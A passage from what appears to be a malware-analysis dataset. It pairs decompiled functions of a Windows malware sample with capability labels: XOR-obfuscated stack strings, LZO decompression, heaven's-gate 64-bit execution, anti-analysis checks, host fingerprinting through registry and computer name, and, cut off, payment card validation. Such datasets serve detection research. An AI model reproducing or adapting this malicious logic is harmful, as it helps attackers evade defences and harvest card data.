var_4h._0_1_ = 0x21;\n    var_4h._1_1_ = 0x49;\n    var_48h = 0x3049446d;\n    var_44h._0_1_ = 0x33;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_2ch = &var_14h - iVar14;\n    do {\n        iVar16 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar16 != 0x87e980) {\n            *(iVar15 + iVar14) = *(&var_48h + iVar15 % var_34h) ^ (iVar15 + iVar14)[&var_14h - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x12);\n    fcn.00409991();\n    var_18h._0_1_ = 0x3f;\n    var_18h._1_1_ = 0x23;\n    var_18h._2_1_ = 0x16;\n    var_18h._3_1_ = 0xd;\n    var_14h._0_1_ = 0x3b;\n    var_14h._1_1_ = 0x16;\n    var_14h._2_1_ = 0x2d;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 0x20;\n    var_10h._1_1_ = 0x1a;\n    var_10h._2_1_ = 0x21;\n    var_10h._3_1_ = 0x25;\n    var_ch._0_1_ = 0x1e;\n    var_ch._1_1_ = 0x2f;\n    var_ch._2_1_ = 0x33;\n    var_ch._3_1_ = 0x1d;\n    var_8h._0_1_ = 0x39;\n    var_8h._1_1_ = 0x10;\n    var_8h._2_1_ = 0xb;\n    var_8h._3_1_ = 0x23;\n    var_4h._0_1_ = 0x45;\n    var_28h = 0x7445466c;\n    var_24h._0_2_ = 0x7555;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_48h = iVar15;\n    var_2ch = &var_18h - iVar15;\n    do {\n        iVar17 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar17 != 0x89a723) {\n            *(iVar16 + iVar15) = *(&var_28h + iVar16 % var_38h) ^ (iVar16 + iVar15)[&var_18h - iVar15];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x15);\n    fcn.00409991();\n    var_1ch._0_1_ = 0x36;\n    var_1ch._1_1_ = 0x2c;\n    var_1ch._2_1_ = 0x7c;\n    var_1ch._3_1_ = 0x5a;\n    var_18h._0_1_ = 0x23;\n    var_18h._1_1_ = 7;\n    var_18h._2_1_ = 0x25;\n    var_18h._3_1_ = 0x5c;\n    var_14h._0_1_ = 0x70;\n    var_14h._1_1_ = 0x27;\n    var_14h._2_1_ = 9;\n    var_14h._3_1_ = 0x2c;\n    var_10h._0_1_ = 0x5e;\n    var_10h._1_1_ = 0x55;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 0xc;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 0x57;\n    var_ch._2_1_ = 100;\n    var_ch._3_1_ = 0x30;\n    var_8h._0_1_ = 0xc;\n    var_8h._1_1_ = 0x3f;\n    var_8h._2_1_ = 0x50;\n    var_8h._3_1_ = 0x58;\n    var_4h._0_1_ = 0x27;\n    var_4h._1_1_ = 2;\n    var_4h._2_1_ = 0x2c;\n    var_4h._3_1_ = 0x39;\n    var_68h = 0x34394965;\n    var_64h._0_1_ = 0x42;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_2ch = &var_1ch - iVar15;\n    do {\n        iVar17 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar17 != 0x31a924) {\n            *(iVar16 + iVar15) = *(&var_68h + iVar16 % var_34h) ^ (iVar16 + iVar15)[&var_1ch - iVar15];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x1c);\n    fcn.00409991();\n    var_18h._0_1_ = 0x3b;\n    var_18h._1_1_ = 0x21;\n    var_18h._2_1_ = 0x1a;\n    var_18h._3_1_ = 5;\n    var_14h._0_1_ = 0x2c;\n    var_14h._1_1_ = 0x50;\n    var_14h._2_1_ = 0xf;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 0xb;\n    var_10h._2_1_ = 0x2e;\n    var_10h._3_1_ = 0x44;\n    var_ch._1_1_ = 0x21;\n    var_ch._2_1_ = 7;\n    var_ch._3_1_ = 0x16;\n    var_8h._0_1_ = 0x2b;\n    var_8h._1_1_ = 0x47;\n    var_8h._2_1_ = 1;\n    var_8h._3_1_ = 0x28;\n    var_4h._0_1_ = 0x32;\n    var_4h._1_1_ = 3;\n    var_4h._2_1_ = 0x27;\n    var_4h._3_1_ = 0x31;\n    var_28h = 0x64574468;\n    var_24h._0_2_ = 0x3142;\n    var_ch._0_1_ = var_18h._3_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar16 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar17 = 0;\n    var_68h = iVar16;\n    var_2ch = &var_18h - iVar16;\n    do {\n        iVar18 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar18 != 0x515592) {\n            *(iVar17 + iVar16) = *(&var_28h + iVar17 % var_38h) ^ (iVar17 + iVar16)[&var_18h - iVar16];\n        }\n        iVar17 = iVar17 + 1;\n    } while (iVar17 < 0x18);\n    fcn.00409991();\n    var_18h._0_1_ = 0x3f;\n    var_18h._1_1_ = 0xf;\n    var_18h._2_1_ = 6;\n    var_18h._3_1_ = 0x3a;\n    var_14h._0_1_ = 0x42;\n    var_14h._1_1_ = 2;\n    var_14h._2_1_ = 0x1e;\n    var_14h._3_1_ = 0x19;\n    var_10h._0_1_ = 0x20;\n    var_10h._1_1_ = 0x39;\n    var_10h._2_1_ = 0x53;\n    var_10h._3_1_ = 0x13;\n    var_ch._0_1_ = 9;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 0x3d;\n    var_ch._3_1_ = 0x3e;\n    var_8h._0_1_ = 0x44;\n    var_8h._1_1_ = 0xe;\n    var_8h._2_1_ = 0;\n    var_8h._3_1_ = 0xf;\n    var_4h._0_1_ = 0x28;\n    var_4h._1_1_ = 0x32;\n    var_4h._2_1_ = 0x32;\n    var_28h = 0x574f6a6c;\n    var_24h._0_2_ = 0x6732;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar16 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar17 = 0;\n    var_2ch = &var_18h - iVar16;\n    do {\n        iVar18 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar18 != 0x1b8b8) {\n            *(iVar17 + iVar16) = *(&var_28h + iVar17 % var_38h) ^ (iVar17 + iVar16)[&var_18h - iVar16];\n        }\n        iVar17 = iVar17 + 1;\n    } while (iVar17 < 0x17);\n    fcn.00409991();\n    var_14h._1_1_ = 6;\n    var_18h._0_1_ = 0x32;\n    var_18h._1_1_ = 0x51;\n    var_18h._2_1_ = 0x74;\n    var_18h._3_1_ = 0x43;\n    var_14h._0_1_ = 0x2b;\n    var_14h._2_1_ = 0x15;\n    var_14h._3_1_ = 0x51;\n    var_10h._0_1_ = 0x70;\n    var_10h._1_1_ = 0x5d;\n    var_10h._2_1_ = 0x21;\n    var_10h._3_1_ = 5;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 0x58;\n    var_ch._2_1_ = 0x67;\n    var_ch._3_1_ = 0x43;\n    var_8h._0_1_ = 0x27;\n    var_8h._1_1_ = 0x11;\n    var_8h._2_1_ = 8;\n    var_8h._3_1_ = 0x58;\n    var_4h._0_1_ = 0x52;\n    var_4h._1_1_ = 0x56;\n    var_4h._2_1_ = 0x2b;\n    var_4h._3_1_ = 0x67;\n    var_28h = 0x31373461;\n    var_24h._0_2_ = 0x674e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar18 = 0;\n    var_2ch = &var_18h - iVar17;\n    do {\n        iVar19 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar19 != 0xa9826a) {\n            *(iVar18 + iVar17) = *(&var_28h + iVar18 % var_38h) ^ (iVar18 + iVar17)[&var_18h - iVar17];\n        }\n        iVar18 = iVar18 + 1;\n    } while (iVar18 < 0x18);\n    fcn.00409991();\n    var_20h = 0x40110d06;\n    var_1ch._0_1_ = 0x3b;\n    var_1ch._1_1_ = 0x15;\n    var_1ch._2_1_ = 0x21;\n    var_1ch._3_1_ = 0xd;\n    var_18h._0_1_ = 0x21;\n    var_18h._1_1_ = 0x71;\n    var_18h._2_1_ = 0x3c;\n    var_18h._3_1_ = 3;\n    var_14h._0_1_ = 0x31;\n    var_14h._1_1_ = 0x25;\n    var_14h._2_1_ = 0x24;\n    var_14h._3_1_ = 0x5c;\n    var_10h._0_1_ = 0xf;\n    var_10h._1_1_ = 5;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 0xd;\n    var_ch._0_1_ = 0x36;\n    var_ch._1_1_ = 0x41;\n    var_ch._2_1_ = 0x1e;\n    var_ch._3_1_ = 0x14;\n    var_8h._0_1_ = 0x3c;\n    var_8h._1_1_ = 0x1e;\n    var_8h._2_1_ = 0x2c;\n    var_8h._3_1_ = 0x5e;\n    var_4h._0_1_ = 0x2b;\n    var_4h._1_1_ = 1;\n    var_4h._2_1_ = 0x30;\n    var_4h._3_1_ = 0x68;\n    var_28h = 0x32456855;\n    var_24h._0_2_ = 0x664e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_2ch = &var_20h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar20 != 0x51abee) {\n            *(iVar19 + iVar18) = *(&var_28h + iVar19 % var_38h) ^ (iVar19 + iVar18)[&var_20h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x20);\n    fcn.00409991();\n    var_8h._0_1_ = 5;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 10;\n    var_14h._2_1_ = 0x28;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x24;\n    var_10h._2_1_ = 0x11;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 0x17;\n    var_ch._2_1_ = 0x15;\n    var_ch._3_1_ = 0x2c;\n    var_8h._1_1_ = 6;\n    var_8h._2_1_ = 0x16;\n    var_8h._3_1_ = 0x22;\n    var_4h._0_1_ = 0;\n    var_4h._1_1_ = 0x20;\n    var_4h._2_1_ = 0x73;\n    var_28h = 0x477a6f73;\n    var_24h._0_2_ = 0x4567;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar20 = 0;\n    var_2ch = &var_14h - iVar19;\n    do {\n        iVar21 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar21 != 0x3b475b) {\n            *(iVar20 + iVar19) = *(&var_28h + iVar20 % var_38h) ^ (iVar20 + iVar19)[&var_14h - iVar19];\n        }\n        iVar20 = iVar20 + 1;\n    } while (iVar20 < 0x13);\n    fcn.00409991();\n    var_20h = 0xc0a203c;\n    var_1ch._0_1_ = 0x51;\n    var_1ch._1_1_ = 0x1d;\n    var_1ch._2_1_ = 0x20;\n    var_1ch._3_1_ = 0x22;\n    var_18h._0_1_ = 0x11;\n    var_18h._1_1_ = 0x57;\n    var_18h._2_1_ = 0x38;\n    var_18h._3_1_ = 0x2a;\n    var_14h._0_1_ = 0x31;\n    var_14h._1_1_ = 9;\n    var_14h._2_1_ = 0x5b;\n    var_14h._3_1_ = 1;\n    var_10h._0_1_ = 0x22;\n    var_10h._1_1_ = 0x10;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 0x46;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x2a;\n    var_ch._3_1_ = 0x14;\n    var_8h._0_1_ = 0x5b;\n    var_8h._1_1_ = 3;\n    var_8h._2_1_ = 0x20;\n    var_8h._3_1_ = 0x24;\n    var_4h._0_1_ = 7;\n    var_4h._1_1_ = 0x32;\n    var_28h = 0x6243456f;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x32);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar20 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar21 = 0;\n    var_2ch = &var_20h - iVar20;\n    do {\n        iVar22 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar22 != 0x4162d1) {\n            *(iVar21 + iVar20) = *(&var_28h + iVar21 % var_34h) ^ (iVar21 + iVar20)[&var_20h - iVar20];\n        }\n        iVar21 = iVar21 + 1;\n    } while (iVar21 < 0x1e);\n    fcn.00409991();\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 0x2d;\n    var_14h._2_1_ = 0x11;\n    var_14h._3_1_ = 0x2d;\n    var_10h._0_1_ = 0x1f;\n    var_10h._1_1_ = 0x54;\n    var_10h._2_1_ = 0x3e;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0x2b;\n    var_ch._1_1_ = 0x21;\n    var_ch._2_1_ = 0x22;\n    var_ch._3_1_ = 0x43;\n    var_8h._0_1_ = 0xd;\n    var_8h._1_1_ = 0x3e;\n    var_8h._2_1_ = 0x2c;\n    var_8h._3_1_ = 0x28;\n    var_4h._0_1_ = 0x17;\n    var_4h._1_1_ = 0x56;\n    var_4h._2_1_ = 1;\n    var_4h._3_1_ = 0x48;\n    var_28h = 0x44454864;\n    var_24h._0_2_ = 0x3172;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar21 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar22 = 0;\n    var_34h = iVar21;\n    var_2ch = &var_14h - iVar21;\n    do {\n        iVar23 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar23 != 0x5f29b2) {\n            *(iVar22 + iVar21) = *(&var_28h + iVar22 % var_38h) ^ (iVar22 + iVar21)[&var_14h - iVar21];\n        }\n        iVar22 = iVar22 + 1;\n    } while (iVar22 < 0x14);\n    fcn.00409991();\n    var_20h = 0x472c1412;\n    var_1ch._0_1_ = 0x35;\n    var_1ch._1_1_ = 0x17;\n    var_1ch._2_1_ = 0x35;\n    var_1ch._3_1_ = 0x14;\n    var_18h._0_1_ = 0x3c;\n    var_18h._1_1_ = 0x4c;\n    var_18h._2_1_ = 0x3d;\n    var_18h._3_1_ = 0x14;\n    var_14h._0_1_ = 0x2e;\n    var_14h._1_1_ = 0x1d;\n    var_14h._2_1_ = 6;\n    var_14h._3_1_ = 0x56;\n    var_10h._0_1_ = 0x1c;\n    var_10h._1_1_ = 0x1f;\n    var_10h._2_1_ = 0x2f;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 0x47;\n    var_ch._2_1_ = 0x39;\n    var_ch._3_1_ = 0;\n    var_8h._0_1_ = 0x28;\n    var_8h._1_1_ = 0x1d;\n    var_8h._2_1_ = 10;\n    var_8h._3_1_ = 0x52;\n    var_4h._0_1_ = 0x35;\n    var_4h._1_1_ = 0x76;\n    var_28h = 0x356f7141;\n    var_24h._0_2_ = 0x7650;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar21 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar22 = 0;\n    var_2ch = &var_20h - iVar21;\n    do {\n        iVar23 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar23 != 0xf0be09) {\n            *(iVar22 + iVar21) = *(&var_28h + iVar22 % var_38h) ^ (iVar22 + iVar21)[&var_20h - iVar21];\n        }\n        iVar22 = iVar22 + 1;\n    } while (iVar22 < 0x1e);\n    fcn.00409991();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar21);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, var_34h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar20);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar19);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar18);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar17);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar16);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_68h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar15);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_48h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar14);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_58h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_60h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_40h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar13);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_50h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar12);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar11);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar10);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar9);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar8);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar6);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_b0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar24);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar4);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 21622
    },
    "0040954d": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0040954d(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    uVar2 = 0;\n    if (arg_ch != 4) {\n        do {\n            iVar3 = 4;\n            puVar1 = 0x41da90;\n            do {\n                iVar3 = iVar3 + -1;\n                if (puVar1[arg_8h + -0x41da90 + uVar2] != *puVar1) {\n                    iVar3 = puVar1[arg_8h + -0x41da90 + uVar2] - *puVar1;\n                    break;\n                }\n                puVar1 = puVar1 + 1;\n            } while (iVar3 != 0);\n            if (iVar3 == 0) {\n                return uVar2 + arg_8h;\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch - 4U);\n    }\n    return 0;\n}\n",
        "token_count": 272
    },
    "004105e0": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004105e0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.00410635(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 184
    },
    "00403f3c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00403f3c(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(*0x41daac);\n    iVar4 = fcn.00402046();\n    iVar7 = -0x43ec94ba;\n    var_28h = 0xd84a20ac;\n    iVar6 = 0;\n    var_24h = 0xeed889c4;\n    var_20h = 0x58636143;\n    piVar1 = piVar3 + 1;\n    var_1ch = 0xc0f26006;\n    var_18h = 0x8606bedd;\n    var_14h = 0xe8cbab78;\n    var_10h = 0x2ab6e04a;\n    var_ch = 0x31e6d1ea;\n    var_8h = 0;\n    do {\n        iVar2 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 != 0);\n    if (piVar3 - piVar1 >> 1 < 0x20) {\n        do {\n            if (iVar4 == iVar7) goto code_r0x00403fcc;\n            iVar7 = (&var_28h)[iVar6];\n            iVar6 = iVar6 + 1;\n        } while (iVar7 != 0);\n        uVar5 = 0;\n    }\n    else {\ncode_r0x00403fcc:\n        uVar5 = 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 469
    },
    "00401dbb": {
        "rules": [
            "contain obfuscated stackstrings",
            "create or open registry key",
            "contain loop",
            "get hostname",
            "query or enumerate registry value",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401dbb(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x411a9c;\n    uStack104 = *0x411a98;\n    uStack108 = *0x411a94;\n    name = *0x411a90;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41dac0;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x411aa0;\n    uStack92 = *0x411aa4;\n    uStack88 = *0x411aa8;\n    uStack84 = *0x411aac;\n    var_3ch = *0x411a80;\n    uStack60 = *0x411a84;\n    uStack56 = *0x411a88;\n    uStack52 = *0x411a8c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(hKey);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x41dac8 = uVar10 ^ uVar8;\n        *0x41dacc = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41dac0 = uVar8;\n        *0x41dac4 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1703
    },
    "00402ac8": {
        "rules": [
            "contain obfuscated stackstrings",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00402ac8(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar4;\n    code *pcVar5;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    ushort var_40h;\n    uchar var_3eh;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    int32_t hHeap;\n    \n    iVar4 = 8;\n    lpString2 = param_1;\n    var_10h = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar5 = 